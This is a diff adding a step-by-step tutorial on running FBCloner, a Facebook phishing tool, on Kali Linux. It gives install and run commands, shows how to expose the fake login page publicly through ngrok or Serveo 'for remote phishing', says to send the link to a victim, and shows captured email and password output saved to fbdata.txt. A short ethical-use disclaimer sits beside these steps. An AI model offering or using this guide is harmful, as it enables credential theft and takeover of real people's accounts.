@@ -1,0 +1,78 @@
+🛠️ How to Use FBCloner Tool in Kali Linux
+FBCloner is a phishing-based Facebook account cloning tool. It is used to create fake login pages that look like Facebook, capturing credentials entered by the target.
+
+⚠️ Warning: This tool is for educational and ethical penetration testing purposes only. Unauthorized use is illegal.
+
+✅ Step-by-Step Installation & Usage of FBCloner on Kali Linux:
+📥 Step 1: Install Dependencies
+Open a terminal and run:
+
+bash
+Copy
+Edit
+sudo apt update && sudo apt install git php curl -y
+📂 Step 2: Clone the Tool
+bash
+Copy
+Edit
+git clone https://github.com/krishpranav/fbcloner.git
+cd fbcloner
+🔧 Step 3: Give Execute Permission
+bash
+Copy
+Edit
+chmod +x *
+🚀 Step 4: Run the Tool
+bash
+Copy
+Edit
+./fbcloner.sh
+🌐 Step 5: Choose Tunneling Option
+You will be asked to choose how the phishing page will be exposed to the internet:
+
+1: Localhost (for testing)
+
+2: Ngrok (for remote phishing)
+
+3: Serveo (alternative to ngrok)
+
+Choose option 2 for real-world demo:
+
+bash
+Copy
+Edit
+2
+Ngrok link will be generated like: https://abcdef1234.ngrok.io
+Send this link to your test victim.
+
+🧪 Step 6: Wait for Login Info
+Once the target enters their email & password on the fake page, you'll see output like:
+
+less
+Copy
+Edit
+[+] Email: victim@gmail.com
+[+] Password: 123456789
+The captured data is saved in:
+
+bash
+Copy
+Edit
+fbcloner/fbdata.txt
+🔁 Bonus Tips:
+🛡️ Use in a controlled testing environment or lab.
+
+🔒 Always test with your own accounts.
+
+🌐 If ngrok fails, try Serveo.net or localhost.run.
+
+🧨 To Stop the Server
+bash
+Copy
+Edit
+CTRL + C
+📂 To Reopen Saved Data
+bash
+Copy
+Edit
+cat fbdata.txt
